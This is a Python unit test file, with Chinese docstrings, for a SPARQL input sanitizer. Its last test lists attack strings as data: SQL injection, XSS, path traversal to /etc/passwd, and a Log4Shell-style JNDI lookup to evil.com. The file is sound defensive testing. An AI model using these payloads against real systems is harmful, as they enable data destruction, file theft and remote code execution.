"""SPARQL 参数安全转义与基本防注入单元测试。

本测试覆盖 P0 计划中 1.1.1 任务要求：
- SPARQLSanitizer 类功能完备；
- 正确转义 IRI 与字面量；
- 危险输入得到拒绝；
- 前缀名校验符合 NCName 约束。
"""
from __future__ import annotations

import pytest

from sf_rdf_acl.query.builder import SPARQLSanitizer


class TestSPARQLSanitizer:
    def test_escape_uri_normal(self) -> None:
        """测试正常 IRI 校验通过。

        参数范围：
        - 输入必须为 http/https 开头的 IRI；
        - 不允许包含 < > " { } | \ ^ ` 等危险字符。
        预期：
        - 返回原始 IRI（不加尖括号）。
        """

        uri = "http://example.com/resource"
        assert SPARQLSanitizer.escape_uri(uri) == uri

    def test_escape_uri_with_dangerous_chars(self) -> None:
        """测试 IRI 包含危险字符时应被拒绝。"""

        with pytest.raises(ValueError):
            SPARQLSanitizer.escape_uri("http://example.com/<script>")

    def test_escape_uri_rejects_non_http_scheme(self) -> None:
        """测试非 http/https 协议的 URI 被拒绝（安全前置约束）。"""

        with pytest.raises(ValueError):
            SPARQLSanitizer.escape_uri("ftp://example.com/file")
        with pytest.raises(ValueError):
            SPARQLSanitizer.escape_uri("javascript:alert(1)")

    def test_escape_literal_with_quotes(self) -> None:
        """测试字面量中的引号/反斜杠被正确转义。

        预期：
        - Hello "World" 转为 "Hello \"World\""（SPARQL 字面量表达式）。
        """

        result = SPARQLSanitizer.escape_literal('Hello "World"')
        assert result == '"Hello \\\"World\\\""'.replace('\\\\', '\\'), "字面量转义不正确"

    def test_escape_literal_with_datatype(self) -> None:
        """测试带数据类型的字面量表达式。"""

        result = SPARQLSanitizer.escape_literal(
            "2023-01-01",
            "http://www.w3.org/2001/XMLSchema#date",
        )
        assert result.endswith('^^<http://www.w3.org/2001/XMLSchema#date>')

    def test_validate_prefix_valid(self) -> None:
        """验证前缀名合法样例。"""

        assert SPARQLSanitizer.validate_prefix("rdf")
        assert SPARQLSanitizer.validate_prefix("my_prefix")
        assert SPARQLSanitizer.validate_prefix("prefix123")

    def test_validate_prefix_invalid(self) -> None:
        """验证前缀名不合法样例。"""

        assert not SPARQLSanitizer.validate_prefix("123prefix")
        assert not SPARQLSanitizer.validate_prefix("pre-fix!")
        assert not SPARQLSanitizer.validate_prefix("")

    def test_sql_injection_attempt(self) -> None:
        """以常见恶意输入模拟注入企图，期望被拒绝（按 IRI 校验策略）。

        说明：escape_uri 要求 http/https 开头，因此以下输入均会抛出 ValueError。
        """

        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]
        for raw in malicious_inputs:
            with pytest.raises(ValueError):
                SPARQLSanitizer.escape_uri(raw)

